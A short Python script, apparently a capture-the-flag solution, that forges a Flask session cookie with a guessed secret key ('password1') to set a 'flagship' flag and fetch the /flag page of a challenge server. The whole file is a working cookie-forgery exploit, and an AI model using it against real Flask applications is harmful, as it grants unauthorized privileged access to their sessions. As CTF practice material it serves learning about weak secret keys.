import requests	

from encoder import *

import random
import string

def randomString(stringLength=8):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

sk = 'password1'
# sessionDict = {u'Hello':'World'}
# cookie = encodeFlaskCookie(sk, sessionDict)
# decodedDict = decodeFlaskCookie(sk, cookie)
# assert sessionDict==decodedDict


def main():
	url = 'https://cookie-forge.cha.hackpack.club/'
	x = requests.Session()
	payload = {'flagship': True, 'username': 'siema'}
	cookie = encodeFlaskCookie(sk, payload)
	# print(cookie)
	# r = x.post(url + 'login', data={
	# 		'username': 'username',
	# 		'password': 'pass123'
	# 	})
	r = requests.get(url + 'flag', cookies={'session': cookie})
	
	if "flag{" in r.text:
		print("good payload" + r.text)
	else:
		print("bad %s" % sk)

if __name__ == '__main__':
	main()



# 	{
#     "flagship": false,
#     "username": "username"
# }